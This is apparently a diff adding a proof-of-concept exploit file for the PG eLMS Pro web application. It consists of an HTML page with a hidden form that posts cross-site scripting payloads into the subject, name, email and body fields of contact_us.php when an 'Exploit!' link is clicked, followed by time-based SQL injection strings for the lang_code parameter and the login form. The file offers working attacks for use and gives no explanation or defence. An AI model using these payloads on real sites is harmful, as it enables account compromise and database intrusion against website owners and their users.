@@ -1,0 +1,24 @@
+&lt;html&gt;
+&lt;title&gt;PG eLMS Pro vDEC_2007_01 (contact_us.php) Multiple POST XSS Vulnerabilities&lt;/title&gt;
+&lt;body bgcolor=&quot;#1C1C1C&quot;&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;function xss1(){document.forms[&quot;xss&quot;].submit();}&lt;/script&gt;
+&lt;form action=&quot;http://www.example.com/contact_us.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;POST&quot; id=&quot;xss&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;send&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;subject&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;body&quot; value=&#039;1&lt;/textarea&gt;&quot;&gt;&lt;script&gt;alert(4)&lt;/script&gt;&#039; /&gt;
+&lt;/form&gt;
+&lt;a href=&quot;javascript: xss1();&quot; style=&quot;text-decoration:none&quot;&gt;
+&lt;b&gt;&lt;font color=&quot;red&quot;&gt;&lt;center&gt;&lt;h3&gt;&lt;br /&gt;&lt;br /&gt;Exploit!&lt;h3&gt;&lt;/center&gt;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+
+- http://www.example.com/index.php?lang_code=1&#039;+and+sleep(5)%23 (get)
+- http://www.example.com/login.php?lang_code=1&#039;+and+sleep(5)%23 (get)
+
+- http://www.example.com/login.php (post)
+
+  login=r00t&#039;+or+sleep(5)%23&amp;password=t00t!
